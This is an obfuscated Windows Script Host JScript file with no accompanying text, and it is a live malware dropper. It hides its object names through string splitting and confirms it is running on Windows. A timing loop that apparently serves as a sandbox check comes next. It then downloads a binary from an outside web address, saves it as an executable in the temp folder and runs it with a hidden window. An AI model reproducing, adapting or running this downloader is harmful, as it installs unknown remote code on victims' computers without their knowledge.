var JN = false;
var R0 = "Create"+"Object";
var AD = function A() {return WScript[R0]("WScript"+".Shell");}(), J = 11;
var SE = "MSXML2"+".XMLHTTP";
var MX = 2;
var K = MX - 2;
function XQ(AZ){AD["Run"](AZ, K, K);};
function CT(){return SE + "";};
function Z(QC, P){K = K * 1; return QC - P;};
function W(){return R0;};
/*@cc_on
  @if (@_win32 || @_win64)
    JN = true;
  @end
@*/
if (JN)
{
var R = "";
function H(){return 22;};
var K0 = 0; var A0 = 0;
function GJ()
{
var MS = new this["Date"]();
var UZ = MS["getUTCMilliseconds"]();
WScript["Sleep"](H());
var MS = new this["Date"]();
var AX = MS["getUTCMilliseconds"]();
WScript["Sleep"](H());
var MS = new this["Date"]();
var X0 = MS["getUTCMilliseconds"]();
var K0 = "X";
K0 = Z(AX, UZ);
var A0 = "U";
A0 = Z(X0, AX);
R = "open";
return Z(K0, A0);
}
var N0 = false;
var D1 = false;
for (var E = K; E < H() * 1; E++){if (GJ() != K){
N0 = true; 
A0 = "31" + 11 * K0 + A0; 
D1 = true; 
break;
}}
function N() {return ((N0 == true) && (N0 == D1)) ? 1 : K;};
if (N0 && N() && D1){
function TO() {return AD["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "U8jwmtwaUI4vR.ex" + "e";};
 Y0 = CT();
 OL = WScript[R0](Y0);
 var D0 = 1;
do { 
	for (;D0;){
	try {
		if (D0 == 1)
		{
			OL[R]("GET", "http://abnreview.com.au/j7dsa", false);
			OL["send"]();
			Y = "Sleep";
			D0 = 2;
		}
		WScript[Y](H() + 120); 
		if (OL["readystate"] < 2 * 2) continue;
		D0 = K;
		function RR(D) {var FX = (1, 2, 3, 4, 5, D); return FX;};
		JC = WScript[W()]("ADODB.Stream");
		Y0 = JC;
		Y0[R]();
		Y0["type"] = RR(1);
		Y0["write"](OL["ResponseBody"]);
		JC["position"] = RR(K);
		Y0["Save" + "ToFile"](TO(), 2);
		JC["cl"+"ose"]();
		Z0 = TO();
		XQ(Z0);
	} catch(U0){};};
}while (D0);
}
}

